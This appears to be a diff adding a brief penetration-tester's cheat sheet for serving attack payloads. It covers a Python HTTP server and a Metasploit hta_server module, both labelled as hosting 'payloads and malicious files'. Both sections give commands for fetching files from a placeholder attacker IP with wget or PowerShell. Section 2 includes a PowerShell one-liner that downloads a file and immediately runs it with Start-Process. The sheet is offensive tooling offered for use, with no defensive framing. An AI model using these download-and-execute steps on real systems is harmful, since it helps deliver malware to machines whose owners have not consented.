@@ -1,0 +1,38 @@
+
+
+########################################################################################################################################################################################
+
+	1) HTTP SERVER
+	+---------------------------------------+
+	| Regular http server with file listing |
+	| Host payloads and malicious files	|
+	+---------------------------------------+
+	cd ~
+	python -m SimpleHTTPServer 80 <—— Python 2
+			 OR
+ 	python -m http.server 80 <—— Python 3
+
+	wget http://<ip>/<file> <—— Linux
+	Invoke-WebRequest -Uri http://<ip>/<filename> -OutFile <filename> <—- Powershell
+
+########################################################################################################################################################################################
+
+	2) HTA SERVER
+	+---------------------------------------+
+	| Similar to http server		|
+	| Host payloads and malicious files	|
+	+---------------------------------------+
+	msfconsole -q
+	use hta_server
+	set payload
+	set SRVHOST <ip>
+	set SRVPORT 80
+	set LHOST <ip>
+	set LPORT 80
+	run -j
+
+	powershell -command “Invoke-WebRequest -Uri http://<ip>/<file> -OutFile ‘C\<path_store_file>\<file_name>’"; Start-Process "C:\<file_name_and_path>"
+	wget http://<ip>/<file_name>
+
+########################################################################################################################################################################################
+
